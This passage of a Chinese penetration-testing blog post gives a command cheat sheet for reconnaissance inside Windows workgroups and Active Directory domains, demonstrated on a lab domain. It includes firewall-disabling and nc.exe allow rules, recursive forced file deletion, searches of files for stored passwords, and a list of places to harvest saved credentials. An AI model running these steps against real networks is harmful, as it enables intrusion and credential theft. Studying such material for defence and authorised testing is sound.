class="number">4</span>.net time /domain</span><br><span class="line">=工作组特征=</span><br><span class="line">------------------------------------------------</span><br><span class="line">找不到域 WORKGROUP 的域控制器。</span><br><span class="line">请键入 NET HELPMSG <span class="number">3913</span> 以获得更多的帮助。</span><br><span class="line">------------------------------------------------</span><br><span class="line">=域特征=[需要域用户才能成功查询]</span><br><span class="line">------------------------------------------------</span><br><span class="line">\\DC.hack7.local的当前时间是<span class="number">2020</span>/<span class="number">7</span>/<span class="number">12</span> <span class="number">13</span>:<span class="number">21</span>:<span class="number">32</span></span><br><span class="line">------------------------------------------------</span><br></pre></td></tr></table></figure><h2 id="工作组内信息收集"><a href="#工作组内信息收集" class="headerlink" title="工作组内信息收集"></a>工作组内信息收集</h2><p>工作组采取的一般都是常规渗透方法，因为工作组一般都是个人和少数服务器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">通常使用的方法有：</span><br><span class="line">扫描网段中的web服务，常用的有phpstudy，wampserver等，来寻找搭建的服务漏洞</span><br><span class="line">扫描开放端口信息，以及对应的服务，判断是否存在漏洞。</span><br><span class="line">扫描主机由于没有更新到最新版本导致的系统漏洞，比如MS17-010，补丁号为KB4013389</span><br><span class="line">hash抓取，hash注入，hash碰撞，口令爆破，IPC登陆，WMI，未授权访问，文件共享系统。</span><br><span class="line">ARP嗅探&#x2F;欺骗攻击（Cain和Ettercap）</span><br><span class="line">DNS劫持，会话劫持。</span><br><span class="line">社会工程学</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><h4 id="用户系统信息收集"><a href="#用户系统信息收集" class="headerlink" title="用户系统信息收集"></a>用户系统信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看当前用户权限</span><br><span class="line">whoami /all</span><br><span class="line"><span class="number">2</span>.查看系统信息</span><br><span class="line">systeminfo</span><br><span class="line">systeminfo /S <span class="number">192.168</span>.<span class="number">1.101</span> /U testlab\test /P <span class="string">&quot;test&quot;</span> 查看远程机器的系统配置</span><br><span class="line"><span class="number">3</span>.查当前机器的机器名,知道当前机器是干什么的</span><br><span class="line">hostname</span><br><span class="line"><span class="number">4</span>.查看在线用户,注意管理员此时在不在</span><br><span class="line">quser</span><br><span class="line">query user</span><br><span class="line">qwinsta</span><br><span class="line"><span class="number">5</span>.查当前机器中所有的用户名,开始搜集准备用户名字典</span><br><span class="line">net user</span><br><span class="line"><span class="number">6</span>.查当前机器中所有的组名,了解不同组的职能,如：IT,HR,admin,file</span><br><span class="line">net localgroup</span><br><span class="line"><span class="number">7</span>.查指定组中的成员列表</span><br><span class="line">net localgroup <span class="string">&quot;Administrators&quot;</span></span><br><span class="line"><span class="number">8</span>.查询本机所有的盘符</span><br><span class="line">wmic logicaldisk get description,name,size,freespace /value</span><br><span class="line">fsutil fsinfo drives</span><br><span class="line">fsutil fsinfo volumeinfo C:|findstr <span class="string">&quot;卷名&quot;</span> 查看卷名称，需要管理员权限</span><br><span class="line"><span class="number">9</span>.防火墙相关</span><br><span class="line">netsh firewall show state查看防火墙状态</span><br><span class="line">netsh firewall show config查看防火墙配置</span><br><span class="line">设置防火墙日志存储位置：</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> currentprofile logging filename <span class="string">&quot;C:\Windows\temp\FirewallLOG.log&quot;</span></span><br><span class="line">关闭防火墙：</span><br><span class="line">netsh firewall get opmode disable  (WIN2003之前)</span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off (WIN2003之后)</span><br><span class="line">允许某个程序的全连接：</span><br><span class="line">netsh firewall add allowdprogram C:\nc.exe <span class="string">&quot;allow nc&quot;</span> enable   (WIN2003之前)</span><br><span class="line">允许某个程序连入：</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line">允许某个程序外连：</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;pass nc&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow program=<span class="string">&quot;C:\nc.exe&quot;</span></span><br><span class="line"><span class="number">10</span>.其他</span><br><span class="line"><span class="built_in">set</span> 查看当前机器的环境变量配置,看有没有我们可以直接利用到的语言环境</span><br><span class="line">ver 查看当前机器的NT内核版本,不弹窗</span><br><span class="line">winver 查看当前机器的NT内核版本,弹窗，在非图形界面不执行这个命令</span><br><span class="line">fsutil fsinfo drives 列出当前机器上的所有盘符</span><br><span class="line">net share 查看当前机器开启的共享</span><br><span class="line">driverquery 查看当前机器安装的驱动列表</span><br><span class="line">net share public_dir=<span class="string">&quot;c:\public&quot;</span> /grant:Everyone,Full 设置共享</span><br><span class="line"><span class="built_in">dir</span> /a<span class="literal">-r</span><span class="literal">-d</span> /s /b找当前用户可读写目录,可能会很多</span><br></pre></td></tr></table></figure><h4 id="网络连接信息收集"><a href="#网络连接信息收集" class="headerlink" title="网络连接信息收集"></a>网络连接信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看tcp/udp网络连接状态信息</span><br><span class="line">netstat <span class="literal">-ano</span> 查看本机所有的tcp,udp端口连接及其对应的pid</span><br><span class="line">netstat <span class="literal">-anob</span> 查看本机所有的tcp,udp端口连接,pid及其对应的发起程序</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;ESTABLISHED&quot;</span> 查看当前正处于连接状态的端口及ip</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;LISTENING&quot;</span> 查看当前正处于监听状态的端口及ip</span><br><span class="line">netstat <span class="literal">-ano</span> | findstr <span class="string">&quot;TIME_WAIT&quot;</span> 查看当前正处于等待状态的端口及ip</span><br><span class="line"><span class="number">2</span>.查看网络配置</span><br><span class="line">ipconfig /all</span><br><span class="line"><span class="number">3</span>.查看本地DNS缓存</span><br><span class="line">ipconfig /displaydns</span><br><span class="line"><span class="number">4</span>.查看路由表</span><br><span class="line">route print</span><br><span class="line"><span class="number">5</span>.查找有价值的内网arp通信记录</span><br><span class="line">arp <span class="literal">-a</span></span><br><span class="line"><span class="number">6</span>.跟踪本机出口ip</span><br><span class="line">tracert <span class="number">8.8</span>.<span class="number">8.8</span></span><br></pre></td></tr></table></figure><h4 id="软件进程信息收集"><a href="#软件进程信息收集" class="headerlink" title="软件进程信息收集"></a>软件进程信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.查看杀毒软件</span><br><span class="line">wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe</span><br><span class="line"><span class="number">2</span>.查看本机安装程序</span><br><span class="line">wmic product get name /value</span><br><span class="line">wmic product get name,version</span><br><span class="line"><span class="number">3</span>.查看当前机器的进程信息</span><br><span class="line">tasklist /svc 显示当前机器所有的进程所对应的服务 [只限于当前用户有权限看到的进程]</span><br><span class="line">tasklist /m 显示本地所有进程所调用的dll [同样只限于当前用户有权限看到的进程]</span><br><span class="line">tasklist /v 寻找进程中有无域管启用的进程，或者杀软进程</span><br><span class="line">tasklist /S <span class="number">192.168</span>.<span class="number">1.1</span> /U testlab\test /P <span class="string">&quot;test&quot;</span>查看远程主机进程列表</span><br><span class="line">taskkill /im iexplore.exe /f 用指定进程名的方式强行结束指定进程</span><br></pre></td></tr></table></figure><h4 id="历史凭证信息收集"><a href="#历史凭证信息收集" class="headerlink" title="历史凭证信息收集"></a>历史凭证信息收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">引用自：https://github.com/klionsec/RedTeamer</span><br><span class="line">批量抓取当前机器上的 <span class="string">&quot;各类基础服务配置文件中保存的各种账号密码&quot;</span></span><br><span class="line">   比如,各种数据库连接配置文件,各类服务自身的配置文件(redis,http basic...)...</span><br><span class="line">想办法 <span class="string">&quot;控制目标 运维管理 / 技术人员 的单机,从这些机器上去搜集可能保存着各类敏感网络资产的账号密码表&quot;</span></span><br><span class="line">   比如, *.ls,*.doc,*.docx, *.txt....</span><br><span class="line">抓取各类 <span class="string">&quot;数据库客户端工具中保存各种数据库连接账号密码</span></span><br><span class="line"><span class="string">   比如,Navicat,SSMS[MSSQL自带客户端管理工具,里面也可能保存的有密码(加密后的base64)]</span></span><br><span class="line"><span class="string">抓取当前系统 &quot;</span>注册表中保存的各类账号密码hash<span class="string">&quot; [ Windows ]</span></span><br><span class="line"><span class="string">抓取当前系统所有 &quot;</span>本地用户的明文密码/hash<span class="string">&quot; [ Windows &amp; linux ]</span></span><br><span class="line"><span class="string">抓取当前系统的所有 &quot;</span>用户token<span class="string">&quot; [ Windows ]</span></span><br><span class="line"><span class="string">抓取 &quot;</span>windows凭据管理器中保存的各类连接账号密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取 &quot;</span>MSTSC 客户端中保存的所有rdp连接账号密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>VNC客户端工具中保存的连接密码<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取 &quot;</span>GPP目录下保存的各类账号密码<span class="string">&quot; [ 包括组策略目录中XML里保存的密码hash 和 NETLOGON目录下的某些脚本中保存的账号密码 ]</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>SSH客户端工具中保存的各种linux系统连接账号密码<span class="string">&quot;, SecureCRT,Xshell,WinSCP,putty</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>浏览器中保存的各种web登录密码和cookie信息<span class="string">&quot;,Chrome [360浏览器],Firefox,IE,QQ浏览器</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>数据库表中保存的各类账号密码hash<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>FTP客户端工具中保存的各种ftp登录账号密码<span class="string">&quot;, filezila, xftp...</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>邮件客户端工具中保存的各种邮箱账号密码<span class="string">&quot;, forxmail, thunderbird...</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>SVN客户端工具中保存的所有连接账号密码及项目地址<span class="string">&quot;</span></span><br><span class="line"><span class="string">抓取各类 &quot;</span>VPN客户端工具中保存的各种vpn链接账号密码<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><h4 id="用户敏感文件收集"><a href="#用户敏感文件收集" class="headerlink" title="用户敏感文件收集"></a>用户敏感文件收集</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.指定目录下搜集各类敏感文件</span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.txt&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.xml&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.mdb&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.sql&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.mdf&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.eml&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*.pst&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*conf*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*bak*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*pwd*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*pass*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*login*&quot;</span></span><br><span class="line"><span class="built_in">dir</span> /a /s /b d:\<span class="string">&quot;*user*&quot;</span></span><br><span class="line"><span class="number">2</span>.指定目录下的文件中搜集各种账号密码</span><br><span class="line">findstr /<span class="built_in">si</span> pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> <span class="built_in">pwd</span> *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line">findstr /<span class="built_in">si</span> user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak</span><br><span class="line"><span class="number">3</span>.查看,删除 指定文件</span><br><span class="line"><span class="built_in">type</span> c:\windows\temp\admin_pass.bak 查看某个文件内容</span><br><span class="line"><span class="built_in">del</span> d:\ad\*.* /a /s /q /f 强制删除指定路径下的所有文件</span><br><span class="line">tree /F /A D:\ &gt;&gt; file_list.txt 导出指定路径下的文件目录结构</span><br><span class="line"><span class="built_in">rd</span> /q/s c:\windows\temp\test 删除文件夹</span><br></pre></td></tr></table></figure><h3 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h3><p>基于icmp</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">0</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">DO</span> @ping <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">7</span>.%I | findstr <span class="string">&quot;TTL=&quot;</span> &gt;&gt; pinglive.txt</span><br></pre></td></tr></table></figure><p>扫描的话建议直接在内网进行扫描，速度和准确率都比较有保障。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">常用的工具[最多<span class="number">10</span>秒一个<span class="type">c</span>段]：nbtscan[基于<span class="type">smb</span>和<span class="type">netbios</span>的内网主机发现方式]、Ladon、自开发工具</span><br><span class="line">socks代理扫描：goby</span><br></pre></td></tr></table></figure><h2 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h2><p>下文仅限于域内的信息收集，均不会涉及域内认证原理等概念，后面会对windows认证方式单独写一篇总结。</p><h3 id="net组件搜集域内信息"><a href="#net组件搜集域内信息" class="headerlink" title="net组件搜集域内信息"></a>net组件搜集域内信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">net user /domain查看当前域中的所有用户名，根据用户名总数大概判断域的规模</span><br><span class="line">net user xingzheng /domain 查看指定用户在当前域中的详细属性信息</span><br><span class="line">net accounts /domain查看当前域的域内账户密码设置策略</span><br><span class="line">net config workstation查看看当前的登录域</span><br><span class="line">net view 查看当前域中在线的机器，不太直观，批处理把机器名对应的ip也显示出来</span><br><span class="line">----</span><br><span class="line">host2ip.bat:先获取机器名保存为computers.txt，然后运行下面的脚本得到pic.csv</span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">cls</span></span><br><span class="line"><span class="built_in">echo</span> Useage: %<span class="number">0</span> computers.txt</span><br><span class="line"><span class="keyword">for</span> /f %%a <span class="keyword">in</span> (%<span class="number">1</span>) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> ping %%a <span class="literal">-4</span> <span class="literal">-n</span> <span class="number">1</span> |find /i <span class="string">&quot;ping&quot;</span> &gt;&gt; log.txt</span><br><span class="line">    ping %%a <span class="literal">-4</span> <span class="literal">-n</span> <span class="number">1</span> |find /i <span class="string">&quot;ping&quot;</span> &gt; %%a.txt</span><br><span class="line">    <span class="keyword">for</span> /f <span class="string">&quot;tokens=2 delims=[]&quot;</span> %%b <span class="keyword">in</span> (%%a.txt) <span class="keyword">do</span> (</span><br><span class="line"> @<span class="built_in">echo</span> %%a,%%b &gt;&gt; pic.csv</span><br><span class="line"> <span class="built_in">del</span> /f /q %%a.txt</span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line"><span class="built_in">echo</span> <span class="keyword">end</span> &gt;&gt; end.txt</span><br><span class="line">----</span><br><span class="line">WIN10下使用Net view会出现如下报错</span><br><span class="line">System error <span class="number">1231</span></span><br><span class="line">System error <span class="number">6118</span></span><br><span class="line">解决：https://social.technet.microsoft.com/Forums/en<span class="literal">-US</span>/<span class="number">6</span>f102ed1<span class="literal">-8e76</span><span class="literal">-4cb7</span><span class="literal">-8dec</span><span class="literal">-05714466d441</span>/net<span class="literal">-view</span><span class="literal">-system</span><span class="literal">-error</span><span class="literal">-1231</span>?forum=win10itpronetworking</span><br><span class="line">----</span><br><span class="line">net view /domain查看内网种所有的域数量和名称</span><br><span class="line">net view /domain:domain_name查看指定域中在线的计算机列表</span><br><span class="line">net time /domain查看时间服务器，一般域控会做时间服务器</span><br><span class="line">net accounts /domain查看当前域的域内账户密码设置策略</span><br><span class="line">net <span class="built_in">group</span> /domain查看当前域中的所有组名</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain查看当前域中的域管账户</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain computers&quot;</span> /domain查看当前域中的所有的计算机名（登录过该域的计算机）</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain controllers&quot;</span> /domain查看域控制器主机名</span><br><span class="line">nltest /domain_trusts查看域内信任关系</span><br></pre></td></tr></table></figure><h3 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wmic useraccount get Caption,sid获取域内所有用户sid</span><br><span class="line">nltest /domain_trusts查看域内信任关系</span><br><span class="line">nltest /domain_trusts /all_trusts /v /server:&lt;域控ip&gt;  查询信任域</span><br><span class="line">nltest /dsgetdc:&lt;域名&gt; /server:&lt;域控ip&gt;  查询域详细信息</span><br><span class="line">dnscmd /zoneexport hack7.local dns.txt※【DC执行】导出域内DNS信息</span><br><span class="line">nslookup <span class="literal">-q</span>=mx hack7.local查看域内邮件服务器</span><br><span class="line">nslookup <span class="literal">-q</span>=ns hack7.local查看域内DNS服务器</span><br><span class="line">netdom query pdc查看域内的主域控，仅限win2008及之后的系统</span><br></pre></td></tr></table></figure><h3 id="dsquery导出域信息"><a href="#dsquery导出域信息" class="headerlink" title="dsquery导出域信息"></a>dsquery导出域信息</h3><p>利用dsquery 工具搜集域内信息，域成员机器需要自己传上去</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer查看当前域内的所有机器,dsquery工具一般在域控上才有,不过你可以上传一个dsquery</span><br><span class="line">dsquery user查看当前域中的所有账户名</span><br><span class="line">dsquery <span class="built_in">group</span>查看当前域内的所有组名</span><br><span class="line">dsquery subnet查看到当前域所在的网段，结合nbtscan使用</span><br><span class="line">dsquery site查看域内所有的web站点</span><br><span class="line">dsquery server查看当前域中的服务器(一般结果只有域控的主机名)</span><br><span class="line">dsquery user domainroot <span class="literal">-name</span> admin* <span class="literal">-limit</span> <span class="number">240</span>  查询前<span class="number">240</span>个以admin开头的用户名</span><br></pre></td></tr></table></figure><h3 id="csvde导出域信息"><a href="#csvde导出域信息" class="headerlink" title="csvde导出域信息"></a>csvde导出域信息</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果你有一个当前有效的域用户账户及密码</span><br><span class="line">csvde.exe –f c:\windows\temp\e.csv –n –s <span class="number">192.168</span>.<span class="number">1.100</span>（DC的IP） –b &lt;域用户名&gt; &lt;域名&gt; &lt;域用户密码&gt;</span><br><span class="line">如果你可以使用域成员主机的system权限或者当前就在DC上</span><br><span class="line">csvde.exe –f c:\windows\temp\e.csv –n –s <span class="number">192.168</span>.<span class="number">1.100</span>（DC的IP)</span><br></pre></td></tr></table></figure><h3 id="dnsdump"><a href="#dnsdump" class="headerlink" title="dnsdump"></a>dnsdump</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsdump.exe <span class="literal">-u</span> &lt;域名&gt;\&lt;用户名&gt; <span class="literal">-p</span> &lt;用户密码&gt;  <span class="literal">-r</span> &lt;域控主机名&gt; dump域内dns记录,导出文件名为record.scv</span><br></pre></td></tr></table></figure><h3 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h3><p>C++实现(未开源)，用于查询域内信息</p><p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p><p>常用命令如下：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.列出域控制器名称</span><br><span class="line">AdFind <span class="literal">-sc</span> dclist</span><br><span class="line"><span class="number">2</span>.查询当前域中在线的计算机</span><br><span class="line">AdFind <span class="literal">-sc</span> computers_active</span><br><span class="line"><span class="number">3</span>.查询当前域中在线的计算机(只显示名称和操作系统)</span><br><span class="line">AdFind <span class="literal">-sc</span> computers_active name operatingSystem</span><br><span class="line"><span class="number">4</span>.查询当前域中所有计算机</span><br><span class="line">AdFind <span class="operator">-f</span> <span class="string">&quot;objectcategory=computer&quot;</span></span><br><span class="line"><span class="number">5</span>.查询当前域中所有计算机(只显示名称和操作系统)</span><br><span class="line">AdFind <span class="operator">-f</span> <span class="string">&quot;objectcategory=computer&quot;</span> name operatingSystem</span><br><span class="line"><span class="number">6</span>.查询域内所有用户</span><br><span class="line">AdFind <span class="literal">-users</span> name</span><br><span class="line"><span class="number">7</span>.查询所有GPO</span><br><span class="line">AdFind <span class="literal">-sc</span> gpodmp</span><br></pre></td></tr></table></figure><h3 id="Bloodhound-Sharphound"><a href="#Bloodhound-Sharphound" class="headerlink" title="Bloodhound/Sharphound"></a>Bloodhound/Sharphound</h3><p>BloodHound以用图与线的形式，将域内用户、计算机、组、Sessions、ACLs以及域内所有相关用户、组、计算机、登陆信息、访问控制策略之间的关系更直观的展现在Red Team面前进行更便捷的分析域内情况，更快速的在域内提升自己的权限。它也可以使Blue Team成员对己方网络系统进行更好的安全检测及保证域的安全性。<br>这里直接介绍需要在内网机器中执行的相关命令：<br>此工具的导出相对来说比较暴力，且目前此工具 exe 原版已经被识别并被各种杀软查杀，包括微软win10自带的杀软 Windows Defender 。</p><p>详细参考： <a href="https://www.anquanke.com/post/id/214046">https://www.anquanke.com/post/id/214046</a> </p><h3 id="SPN扫描"><a href="#SPN扫描" class="headerlink" title="SPN扫描"></a>SPN扫描</h3><p>不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。大部分win系统默认已自带spn探测工具即：setspn.exe，此操作无需管理权限，需域内机器执行。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn <span class="literal">-T</span> target.com <span class="literal">-Q</span> */*可完整查出当前域内所有spn</span><br></pre></td></tr></table></figure><p>详细介绍：<a href="http://hackergu.com/kerberos-sec-spn-search/">域安全-SPN扫描</a></p><h3 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h3><p>详细介绍：<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF%E7%9A%84%E8%8E%B7%E5%8F%96/">渗透基础——活动目录信息的获取</a></p><h3 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h3><h4 id="查询dns解析记录"><a href="#查询dns解析记录" class="headerlink" title="查询dns解析记录"></a>查询dns解析记录</h4><p>若当前主机的dns为域内dns，可通过查询dns解析记录定位域控。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\xingzheng&gt;nslookup <span class="literal">-type</span>=all _ldap._tcp.dc._msdcs.hack7.local</span><br><span class="line"></span><br><span class="line">DNS request timed out.</span><br><span class="line">    timeout was <span class="number">2</span> seconds.</span><br><span class="line">服务器:  UnKnown</span><br><span class="line">Address:  <span class="number">192.168</span>.<span class="number">86.109</span></span><br><span class="line"></span><br><span class="line">_ldap._tcp.dc._msdcs.hack7.local        SRV service location:</span><br><span class="line">          priority       = <span class="number">0</span></span><br><span class="line">          weight         = <span class="number">100</span></span><br><span class="line">          port           = <span class="number">389</span></span><br><span class="line">          svr hostname   = dc.hack7.local</span><br><span class="line">dc.hack7.local  internet address = <span class="number">192.168</span>.<span 